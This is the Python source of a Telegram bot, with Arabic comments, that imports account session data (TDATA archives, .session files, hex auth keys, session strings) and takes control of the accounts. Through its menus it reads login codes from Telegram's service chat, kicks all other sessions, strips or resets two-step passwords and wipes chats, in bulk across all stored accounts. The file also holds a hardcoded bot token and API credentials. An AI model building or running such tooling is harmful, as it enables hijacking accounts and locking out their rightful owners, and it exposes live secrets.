import os
import re
import sys
import time
import sqlite3
import zipfile
import shutil
import asyncio
import base64
import struct
import traceback
import logging

# =========================================================
# 🚨 رادار الأخطاء (كاشف الأعطال الصامتة لمنع توقف البوت)
# =========================================================

logging.basicConfig(
    level=logging.INFO, 
    format="%(asctime)s [%(levelname)s] %(message)s", 
    handlers=[logging.StreamHandler(sys.stdout)]
)

def radar_exception_handler(exctype, value, tb): 
    logging.critical("\n" + "="*50)
    logging.critical("🚨 [رادار الأعطال] تم تجاوز الخطأ لضمان استقرار البوت!")
    logging.critical("".join(traceback.format_exception(exctype, value, tb)))
    logging.critical("="*50 + "\n")

sys.excepthook = radar_exception_handler

try: 
    asyncio.get_event_loop() 
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import telebot 
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton 
from pyrogram import Client 
from pyrogram.enums import ChatType 
from pyrogram.errors import FloodWait, AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan, PasswordHashInvalid, CloudPasswordMissing
from telethon.sessions import StringSession 
from telethon.crypto import AuthKey

# المكتبة المتخصصة لفك تشفير TDATA
try: 
    from opentele.td import TDesktop 
    OPENTELE_AVAILABLE = True 
except ImportError: 
    OPENTELE_AVAILABLE = False 
    logging.warning("⚠️ مكتبة 'opentele' غير مثبتة! يرجى كتابة: pip install opentele") 
except BaseException:
    OPENTELE_AVAILABLE = False 

# --- المتغيرات الأساسية ---
API_ID = 28797361
API_HASH = "771041b32e83ab232e066b7adeee700b"
BOT_TOKEN = "8960187108:AAGevNJ_kOtfCkvnY0rpZ3VtUZPqFfmSrr8"

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=20) 

# حالة المستخدمين لحفظ خطوات التحقق بخطوتين
USER_STATES = {}

# =========================================================
# 🗄️ إدارة قواعد البيانات
# =========================================================

def get_db_conn(): 
    return sqlite3.connect('accounts_pro.db', check_same_thread=False, timeout=20)

def init_db(): 
    conn = get_db_conn() 
    c = conn.cursor() 
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT)''') 
    conn.commit() 
    conn.close()

def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type): 
    conn = get_db_conn() 
    c = conn.cursor() 
    c.execute("INSERT INTO sessions (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type) VALUES (?, ?, ?, ?, ?, ?, ?)", (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type))
    conn.commit() 
    conn.close()

def get_all_accounts(owner_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, user_id, pyro_session FROM sessions WHERE owner_id=?", (owner_id,)) 
    rows = c.fetchall() 
    conn.close() 
    return rows

def get_account(acc_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id=?", (acc_id,)) 
    row = c.fetchone()
    conn.close() 
    return row

def delete_account(acc_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("DELETE FROM sessions WHERE id=?", (acc_id,)) 
    conn.commit()
    conn.close()

def check_duplicate(owner_id, user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id FROM sessions WHERE owner_id=? AND user_id=?", (owner_id, user_id))
    exists = c.fetchone()
    conn.close()
    return bool(exists)

init_db()

# =========================================================
# 🧠 دوال مساعدة ذكية (سنة الإنشاء + طرد الجلسات + تحويل السشن)
# =========================================================

def get_creation_year(user_id):
    """حساب سنة إنشاء الحساب بناءً على الآيدي بدقة من 2013 لـ 2026"""
    uid = int(user_id)
    if uid < 5000000: return "2013"
    if uid < 50000000: return "2014"
    if uid < 150000000: return "2015"
    if uid < 300000000: return "2016"
    if uid < 500000000: return "2017"
    if uid < 750000000: return "2018"
    if uid < 1000000000: return "2019"
    if uid < 5000000000: return "2020 أو 2021"
    if uid < 6000000000: return "2022"
    if uid < 7000000000: return "2023"
    if uid < 8000000000: return "2024"
    if uid < 9000000000: return "2025"
    return "2026 (أو أحدث)"

async def confirm_session_death(pyro_session):
    """نظام الفرصة الثانية: يتأكد 100% أن الجلسة مطرودة قبل الحذف"""
    await asyncio.sleep(1.5) # انتظار لتجاوز مشاكل الشبكة المؤقتة
    test_client = Client(f"retry_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        await test_client.connect()
        await test_client.get_me()
        await test_client.disconnect()
        return False # الجلسة لم تمت! كانت مجرد مشكلة مؤقتة
    except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
        return True # الجلسة مطرودة رسمياً
    except Exception:
        return False # خطأ آخر مثل FloodWait، لن نحذف الحساب احتياطياً

def handle_dead_session(owner_id, acc_id, phone, name):
    delete_account(acc_id)
    text = f"🛂┊ **تـنـبـيـه هـام - طـرد جـلـسـة !**\n\n" \
           f"⎉╎ **تـم طـرد جـلـسـة الـبـوت لـحـسـاب:**\n" \
           f"⎉╎ **الاسـم:** {name}\n" \
           f"⎉╎ **الـرقـم:** `{phone}`\n" \
           f"•❐• **تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً.**"
    try: bot.send_message(owner_id, text, parse_mode="Markdown")
    except: pass

def convert_telethon_to_pyrogram(session_str):
    """يحول جلسة تليثون إلى جلسة بايروجرام تلقائياً للتعرف عليها"""
    if session_str.startswith("1") and len(session_str) > 300:
        try:
            data = base64.urlsafe_b64decode(session_str[1:] + "=" * (-len(session_str[1:]) % 4))
            ip_len = 4 if len(data) == 265 else 16
            dc_id, = struct.unpack(">B", data[:1])
            auth_key = data[1 + ip_len + 2:]
            return generate_sessions(API_ID, dc_id, auth_key)[0]
        except: pass
    return session_str

# --- واجهات التحكم بالبوت ---
def home_keyboard(): 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
    markup.row(InlineKeyboardButton("• تـنـظـيـف شـامـل 🧹", callback_data="menu_clean"), InlineKeyboardButton("• جـلـب الـكـود ✉️", callback_data="req_code"))
    markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
    markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
    markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))
    return markup

def accounts_action_keyboard(owner_id, action): 
    accounts = get_all_accounts(owner_id) 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data=f"act_{action}_all"))
    for acc_id, phone, name, uid, _ in accounts:
        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"act_{action}_{acc_id}")) 
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home")) 
    return markup

def two_fa_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• حـذف الـتـحـقـق 🗑️", callback_data="menu_2fa_remove"), InlineKeyboardButton("• تـغـيـيـر الـتـحـقـق 🔄", callback_data="menu_2fa_change"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    return markup

# --- الأوامر والردود ---
@bot.message_handler(commands=['start']) 
def start_message(message):
    bot.reply_to(
        message, 
        "🛂┊ **أهـلاً بـك فـي بـوت الإدارة الاحـتـرافـي !**\n\n"
        "⎉╎ أرْسـل مـلـف **TDATA** (بـصـيـغـة ZIP).\n"
        "⎉╎ أو أرْسـل مـلـف **.session** مـبـاشـرة.\n"
        "⎉╎ أو أرْسـل مـفـتـاح **AuthKey (HEX)**.\n"
        "⎉╎ أو أرْسـل نـص **Session (بايروجرام / تليثون)**.\n"
        "•❐• الـبـوت يـتـعـرف تـلـقـائـيـاً عـلـى الـنـوع.\n\n"
        "تـحـكـم بـحـسـابـاتـك بـالـكـامـل مـن الأسـفـل ⬇️", 
        reply_markup=home_keyboard(), 
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "back_home") 
def back_home(call):
    if call.from_user.id in USER_STATES: del USER_STATES[call.from_user.id]
    bot.edit_message_text("🛂┊ **الـقـائـمـة الـرئـيـسـيـة:**", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

# =========================================================
# 🕵️ كشف وفحص الحسابات
# =========================================================

@bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
def reveal_accounts(call): 
    accounts = get_all_accounts(call.from_user.id) 
    if not accounts: 
        return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True) 

    text = f"🛂┊ **كشـف الحـسـابات -**\n\n⎉╎ **تم العثور على {len(accounts)} حـسـاب**\n\n" 
    for acc_id, phone, name, uid, _ in accounts: 
        year = get_creation_year(uid)
        text += f"▪️ **الـرقـم:** `{phone}`\n▪️ **الاسـم:** {name}\n▪️ **الآيـدي:** `{uid}`\n▪️ **سـنـة الإنـشـاء:** {year}\n〰️〰️〰️〰️〰️〰️〰️〰️\n" 

    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home")) 
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check_active")
def check_active_accounts(call):
    bot.answer_callback_query(call.id, "⏳ جاري فحص الحسابات...") 
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص الـحـسـابـات الـشـغـالـة...", parse_mode="Markdown")
    asyncio.run(check_active_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def check_active_async(owner_id, chat_id, msg_id):
    accounts = get_all_accounts(owner_id)
    if not accounts: 
        return bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard())
    
    active_count = 0
    text = "🛂┊ **نـتـيـجـة فـحـص الـحـسـابـات:**\n\n"
    
    for acc_id, phone, name, uid, pyro_session in accounts:
        client = Client(f"chk_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await client.connect()
            await client.get_me()
            year = get_creation_year(uid)
            text += f"✅ `{phone}` | `{uid}` | {year}\n"
            active_count += 1
        except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
            is_dead = await confirm_session_death(pyro_session)
            if is_dead:
                handle_dead_session(owner_id, acc_id, phone, name)
                text += f"❌ `{phone}` (تـم طـرده وحـذفـه)\n"
            else:
                text += f"⚠️ `{phone}` (خـطـأ مـؤقـت، الـجـلـسـة بـخـيـر)\n"
                active_count += 1
        except Exception:
            text += f"⚠️ `{phone}` (فـشـل الاتـصـال بـسـبـب الـشـبـكـة)\n"
            active_count += 1
        finally:
            if client.is_connected: await client.disconnect()
            
    text = f"⎉╎ **الـجـلـسـات الـنـشـطـة الآن:** {active_count} مـن اصـل {len(accounts)}\n\n" + text
    bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard())

# =========================================================
# 🔄 محرك جلب الأكواد الذكي 
# =========================================================

@bot.callback_query_handler(func=lambda call: call.data == "req_code") 
def scan_all_codes(call): 
    bot.answer_callback_query(call.id, "⏳ جاري جلب الأكواد...") 
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري جـلـب الأكـواد مـن الـحـسـابـات...", parse_mode="Markdown")
    asyncio.run(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def fetch_all_codes_async(owner_id, chat_id, msg_id): 
    accounts = get_all_accounts(owner_id) 
    found_codes = []
    
    for acc_id, phone, name, uid, pyro_session in accounts:
        exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await exec_client.connect()
            async for msg in exec_client.get_chat_history(777000, limit=2):
                if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                    match = re.search(r'\b(\d{5})\b', msg.text)
                    if match:
                        found_codes.append((phone, match.group(1)))
                        break  
        except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
            is_dead = await confirm_session_death(pyro_session)
            if is_dead: handle_dead_session(owner_id, acc_id, phone, name)
        except: pass  
        finally:
            if exec_client.is_connected: await exec_client.disconnect()

    if found_codes:
        text = "🛂┊ **تـم جـلـب أكـواد الـدخـول:**\n\n"
        for phone, code in found_codes:
            text += f"⎉╎ **الـرقـم:** `{phone}`\n"
            text += f"•❐• **الـكـود:** `{code}`\n━━━━━━━━━━━━━━━━\n"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard())
    else:
        bot.edit_message_text("❌ لـم يـصـل أي كـود جـديـد.", chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard())

# =========================================================
# ⚙️ قوائم التنفيذ وإدارة الحسابات
# =========================================================

@bot.callback_query_handler(func=lambda call: call.data == "menu_2fa_manage")
def menu_2fa_manage(call):
    bot.edit_message_text("🛂┊ **إدارة الـتـحـقـق بـخـطـوتـيـن:**\n\n⎉╎ اخـتـر الـعـمـلـيـة الـمـطـلـوبـة:", call.message.chat.id, call.message.message_id, reply_markup=two_fa_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: re.match(r"^menu_(terminate|clean|logout|remove|2fa_remove|2fa_change)$", call.data)) 
def action_menus(call):
    action = call.data.replace("menu_", "")
    titles = { 
        "terminate": "🛂┊ **إنـهـاء الـجـلـسـات الأُخـرى:**\n⎉╎ اخـتـر حـسـابـاً أو نـفـذ عـلـى الـجـمـيـع:", 
        "clean": "🛂┊ **الـتـنـظـيـف الـشـامـل:**\n⎉╎ اخـتـر حـسـابـاً أو نـفـذ عـلـى الـجـمـيـع:", 
        "logout": "🛂┊ **تـسـجـيـل خـروج نـهـائـي:**\n⎉╎ اخـتـر حـسـابـاً لـلـخـروج مـنـه:",
        "remove": "🛂┊ **إزالـة مـن الـبـوت (بـدون خـروج):**\n⎉╎ اخـتـر حـسـابـاً لـحـذفـه بـرمـجـيـاً:",
        "2fa_remove": "🛂┊ **حـذف الـتـحـقـق بـخـطـوتـيـن:**\n⎉╎ اخـتـر الـحـسـاب الـمـسـتـهـدف:",
        "2fa_change": "🛂┊ **تـغـيـيـر الـتـحـقـق بـخـطـوتـيـن:**\n⎉╎ اخـتـر الـحـسـاب الـمـسـتـهـدف:"
    } 
    bot.edit_message_text(titles[action], call.message.chat.id, call.message.message_id, reply_markup=accounts_action_keyboard(call.from_user.id, action), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: re.match(r"^act_(terminate|clean|logout|remove|2fa_remove|2fa_change)_(all|\d+)$", call.data)) 
def execute_action(call): 
    data = call.data.split("_") 
    action = data[1] if len(data) == 3 else f"{data[1]}_{data[2]}"
    target = data[-1]
    
    if action in ["2fa_remove", "2fa_change"]:
        USER_STATES[call.from_user.id] = {"action": action, "target": target}
        msg = bot.send_message(call.message.chat.id, "•❐• أرسـل **كـلـمـة الـسـر الـحـالـيـة** لـلـحـسـاب (أرسـل 'لا يوجد' إذا لـم يـكـن هـنـاك بـاسـوورد):", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_2fa_old_pass)
        return

    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري الـعـمـل عـلـى طـلـبـك...", parse_mode="Markdown")

    if target == "all":
        accounts = get_all_accounts(call.from_user.id)
        results = []
        for acc in accounts: 
            res = asyncio.run(perform_action_async(action, acc[0], call.from_user.id))
            results.append(res)
            time.sleep(0.5) 
        final_text = "🛂┊ **مـلـخـص الـعـمـلـيـة:**\n\n" + "\n".join(results)
        bot.edit_message_text(final_text, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
    else:
        msg = asyncio.run(perform_action_async(action, int(target), call.from_user.id))
        bot.edit_message_text(msg, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

async def perform_action_async(action, acc_id, owner_id): 
    acc = get_account(acc_id) 
    if not acc: return "❌ الـحـسـاب غـيـر مـوجـود." 
    _, _, phone, user_id, first_name, pyro_session, _, _ = acc

    if action == "remove":
        delete_account(acc_id)
        return f"✅ تـم إزالـة `{phone}` مـن الـبـوت بـنـجـاح."

    try:
        exec_client = Client(f"exec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        await exec_client.connect()
    except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
        is_dead = await confirm_session_death(pyro_session)
        if is_dead:
            handle_dead_session(owner_id, acc_id, phone, first_name)
            return f"❌ الـحـسـاب `{phone}` مـطـرود تـم حـذفـه."
        return f"⚠️ خـطـأ مـؤقـت بـالـشـبـكـة لـ `{phone}`، حـاول مـجـدداً."
    except Exception: return f"❌ فـشـل الاتـصـال بـ `{phone}`"

    result_msg = ""
    try:
        if action == "terminate":
            auths = await exec_client.get_authorizations()
            for auth in auths:
                if not auth.is_current:
                    await exec_client.terminate_session(auth.hash)
                    await asyncio.sleep(0.5)
            result_msg = f"✅ تـم إنـهـاء الـجـلـسـات لـ `{phone}`."

        elif action == "clean":
            async for dialog in exec_client.get_dialogs():
                try:
                    if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                        await exec_client.leave_chat(dialog.chat.id)
                        await asyncio.sleep(0.3)
                    elif dialog.chat.type == ChatType.PRIVATE and not dialog.chat.is_verified:
                        await exec_client.delete_chat_history(dialog.chat.id)
                        await asyncio.sleep(0.3)
                except FloodWait as e: await asyncio.sleep(e.value)
                except: continue
            result_msg = f"🧹 تـم الـتـنـظـيـف بـنـجـاح لـ `{phone}`."

        elif action == "logout":
            await exec_client.log_out()
            delete_account(acc_id)
            result_msg = f"🚪 تـم تـسـجـيـل الـخـروج مـن `{phone}`."

    except Exception as e: 
        if "fresh_reset_authorisation_forbidden" in str(e).lower():
            result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة لـلإنـهـاء."
        else:
            result_msg = f"❌ خـطـأ فـي `{phone}`."
    finally:
        if exec_client.is_connected: await exec_client.disconnect()

    return result_msg

# =========================================================
# 🔐 نظام إدارة التحقق بخطوتين (2FA)
# =========================================================

def process_2fa_old_pass(message):
    uid = message.from_user.id
    if uid not in USER_STATES: return
    
    old_pass = message.text.strip()
    if old_pass == "لا يوجد": old_pass = ""
    
    USER_STATES[uid]["old_pass"] = old_pass
    
    if USER_STATES[uid]["action"] == "2fa_change":
        msg = bot.send_message(message.chat.id, "•❐• أرسـل **كـلـمـة الـسـر الـجـديـدة**:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_2fa_new_pass)
    else:
        execute_2fa_action(message, uid)

def process_2fa_new_pass(message):
    uid = message.from_user.id
    if uid not in USER_STATES: return
    USER_STATES[uid]["new_pass"] = message.text.strip()
    execute_2fa_action(message, uid)

def execute_2fa_action(message, uid):
    state = USER_STATES.pop(uid)
    target = state["target"]
    action = state["action"]
    old_pass = state.get("old_pass", "")
    new_pass = state.get("new_pass", "")
    
    status_msg = bot.send_message(message.chat.id, "⏳ جـاري تـنـفـيـذ طـلـبـك، يـرجـى الانـتـظـار...")
    
    results = []
    accounts = get_all_accounts(uid) if target == "all" else [(int(target),)] 
    
    for acc in accounts:
        acc_id = acc[0]
        acc_data = get_account(acc_id)
        if not acc_data: continue
        _, _, phone, _, name, pyro_session, _, _ = acc_data
        
        client = Client(f"2fa_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            asyncio.run(client.connect())
            if action == "2fa_remove":
                asyncio.run(client.remove_cloud_password(password=old_pass))
                results.append(f"✅ `{phone}`: تـم حـذف الـتـحـقـق.")
            elif action == "2fa_change":
                asyncio.run(client.enable_cloud_password(password=new_pass, hint="Secured") if old_pass == "" else client.change_cloud_password(current_password=old_pass, new_password=new_pass))
                results.append(f"✅ `{phone}`: تـم تـعـيـيـن الـتـحـقـق.")
        except PasswordHashInvalid:
            results.append(f"❌ `{phone}`: كـلـمـة الـسـر الـقـديـمـة خـاطـئـة.")
        except CloudPasswordMissing:
            results.append(f"⚠️ `{phone}`: لا يـوجـد تـحـقـق مـفـعـل أصـلاً.")
        except (AuthKeyUnregistered, SessionRevoked):
            is_dead = asyncio.run(confirm_session_death(pyro_session))
            if is_dead:
                handle_dead_session(uid, acc_id, phone, name)
                results.append(f"❌ `{phone}`: مـطـرود مـن قـبـل.")
            else: results.append(f"⚠️ `{phone}`: خـطـأ اتـصـال مـؤقـت.")
        except Exception as e:
            results.append(f"❌ `{phone}`: فـشـل - {type(e).__name__}")
        finally:
            if client.is_connected: asyncio.run(client.disconnect())
            
    final_text = "🛂┊ **نـتـيـجـة عـمـلـيـة الـتـحـقـق:**\n\n" + "\n".join(results)
    bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

# =========================================================
# 📥 محرك تسجيل الدخول (نص - TDATA - ملفات Session)
# =========================================================

def get_dc_ip(dc_id): 
    ips = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"} 
    return ips.get(dc_id, "149.154.167.51")

def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999): 
    pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False) 
    pyro_session = base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("=")
    session = StringSession()
    session._dc_id = dc_id
    session._server_address = get_dc_ip(dc_id)
    session._port = 443  
    session._auth_key = AuthKey(auth_key_bytes)
    return pyro_session, session.save()

async def extract_tdata_official(base_dir): 
    if not OPENTELE_AVAILABLE: return None, None, None
    tdata_path = None
    for root, dirs, files in os.walk(base_dir):
        if 'key_datas' in files: tdata_path = root; break
    if not tdata_path: return None, None, None

    try:
        tdesk = TDesktop(tdata_path)
        if not tdesk.isLoaded(): return None, None, None

        def get_real_auth(acc):
            auth_key = getattr(acc, 'authKey', getattr(acc, 'api', None))
            if auth_key: auth_key = getattr(auth_key, 'key', getattr(auth_key, 'auth_key', auth_key))
            dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', getattr(getattr(acc, 'api', None), 'dc_id', None))))
            user_id = getattr(acc, 'UserId', getattr(acc, 'id', 9999))
            if isinstance(auth_key, bytes) and len(auth_key) == 256 and dc_id:
                return int(dc_id), auth_key, int(user_id)
            return None, None, None

        for acc in (tdesk.accounts if hasattr(tdesk, 'accounts') else []) + ([tdesk.mainAccount] if hasattr(tdesk, 'mainAccount') else []):
            d, a, u = get_real_auth(acc)
            if d and a: return d, a, u
    except: pass
    return None, None, None

def process_successful_login(message, status_msg, me, pyro_session, session_type="Session"):
    if check_duplicate(message.from_user.id, me.id):
        bot.edit_message_text("⚠️ **الـحـسـاب مـوجـود بـالـفـعـل فـي الـبـوت مـسـبـقـاً!**", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
        return

    phone = me.phone_number or "Unknown"
    first_name = me.first_name or "User"
    year = get_creation_year(me.id)
    
    save_account(message.from_user.id, phone, me.id, first_name, pyro_session, "", session_type)
    
    text = f"🛂┊ **تـم تـسـجـيـل الـدخـول بـنـجـاح !**\n\n" \
           f"⎉╎ **الاسـم:** {first_name}\n" \
           f"⎉╎ **الـرقـم:** `+{phone.replace('+', '')}`\n" \
           f"⎉╎ **الآيـدي:** `{me.id}`\n" \
           f"•❐• **سـنـة الإنـشـاء:** {year}\n\n" \
           f"تـحـكـم بـحـسـابـك مـن الأزرار أدناه:"
    bot.edit_message_text(text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
def handle_text_input(message):
    text = message.text.strip()
    hex_match = re.search(r'\b([0-9a-fA-F]{512})\b', text)

    # 1. حالة الـ Hex AuthKey
    if hex_match:
        hex_key = hex_match.group(1)
        dc_match = re.search(r'\b([1-5])\b', text.replace(hex_key, ""))
        dcs_to_test = [int(dc_match.group(1))] if dc_match else [1, 2, 3, 4, 5]
        
        status_msg = bot.reply_to(message, "⏳ جـاري الاتـصـال بـمـفـتـاح الـ Hex...")
        
        async def verify_hex():
            auth_bytes = bytes.fromhex(hex_key)
            for dc_id in dcs_to_test:
                pyro_sess, _ = generate_sessions(API_ID, dc_id, auth_bytes, 9999)
                client = Client(f"hx_{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
                try:
                    await client.connect()
                    me = await client.get_me()
                    await client.disconnect()
                    return me, pyro_sess
                except Exception:
                    if client.is_connected: await client.disconnect()
            return None, None

        me, p_sess = asyncio.run(verify_hex())
        if me: process_successful_login(message, status_msg, me, p_sess, "Hex")
        else: bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة أو مـطـرودة.", message.chat.id, status_msg.message_id)

    # 2. حالة السشن العادي (Telethon / Pyrogram)
    elif len(text) > 50 and " " not in text:
        status_msg = bot.reply_to(message, "⏳ جـاري فـحـص مـفـتـاح الـجـلـسـة...")
        
        # التأكد إذا كانت جلسة تليثون وتحويلها
        converted_session = convert_telethon_to_pyrogram(text)

        async def verify_txt():
            try:
                client = Client(f"tx_{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=converted_session, in_memory=True)
                await client.connect()
                me = await client.get_me()
                pyro_sess = await client.export_session_string() # توحيد الصيغة لبايروجرام
                await client.disconnect()
                return me, pyro_sess
            except Exception: return None, None

        me, p_sess = asyncio.run(verify_txt())
        if me: process_successful_login(message, status_msg, me, p_sess, "String")
        else: bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة أو مـطـرودة.", message.chat.id, status_msg.message_id)

@bot.message_handler(content_types=['document']) 
def handle_files(message):
    file_name = message.document.file_name.lower()
    
    # حالة ملفات الجلسة (Telethon أو Pyrogram .session)
    if file_name.endswith(".session"):
        status_msg = bot.reply_to(message, "•❐• جـاري قـراءة مـلـف الـجـلـسـة...", parse_mode="Markdown")
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        temp_name = f"sess_{message.from_user.id}_{int(time.time())}"
        with open(f"{temp_name}.session", 'wb') as f: f.write(downloaded)
        
        async def verify_file():
            try:
                client = Client(temp_name, api_id=API_ID, api_hash=API_HASH)
                await client.connect()
                me = await client.get_me()
                p_sess = await client.export_session_string()
                await client.disconnect()
                return me, p_sess
            except Exception: return None, None
            finally:
                if os.path.exists(f"{temp_name}.session"): os.remove(f"{temp_name}.session")

        me, p_sess = asyncio.run(verify_file())
        if me: process_successful_login(message, status_msg, me, p_sess, "File")
        else: bot.edit_message_text("❌ مـلـف الـجـلـسـة مـعـطـوب أو مـنـتـهـي.", message.chat.id, status_msg.message_id)

    # حالة ملفات TDATA
    elif file_name.endswith(".zip"):
        status_msg = bot.reply_to(message, "•❐• جـاري سـحـب TDATA...", parse_mode="Markdown")
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)

        extract_dir = f"tmp_{message.from_user.id}_{int(time.time())}"
        os.makedirs(extract_dir, exist_ok=True)
        local_path = os.path.join(extract_dir, file_name)
        with open(local_path, 'wb') as f: f.write(downloaded)

        try:
            with zipfile.ZipFile(local_path, 'r') as zip_ref: zip_ref.extractall(extract_dir)
            dc_id, auth_key, user_id = asyncio.run(extract_tdata_official(extract_dir))

            if dc_id and auth_key:
                p_sess, _ = generate_sessions(API_ID, dc_id, auth_key, user_id)
                async def verify_tdata():
                    client = Client(f"td_{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=p_sess, in_memory=True)
                    try:
                        await client.connect()
                        me = await client.get_me()
                        await client.disconnect()
                        return me
                    except Exception: return None
                
                me = asyncio.run(verify_tdata())
                if me: process_successful_login(message, status_msg, me, p_sess, "TDATA")
                else: bot.edit_message_text("❌ TDATA مـعـطـوبـة أو مـسـجـل خـروج.", message.chat.id, status_msg.message_id)
            else:
                bot.edit_message_text("❌ لـم يـتـم الـعـثـور عـلـى بـيـانـات داخـل الـ ZIP.", message.chat.id, status_msg.message_id)
        except Exception:
            bot.edit_message_text("❌ مـلـف ZIP غـيـر صـالـح.", message.chat.id, status_msg.message_id)
        finally:
            shutil.rmtree(extract_dir, ignore_errors=True)

# =========================================================
# 🚀 تشغيل البوت المباشر القوي
# =========================================================

if __name__ == "__main__": 
    logging.info("🚀 جاري إطلاق البوت...")
    try: 
        bot.remove_webhook() 
        time.sleep(1) 
    except: pass

    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=15)
        except Exception as e:
            logging.error(f"⚠️ انقطع الاتصال .. إعادة التشغيل التلقائي")
            time.sleep(3)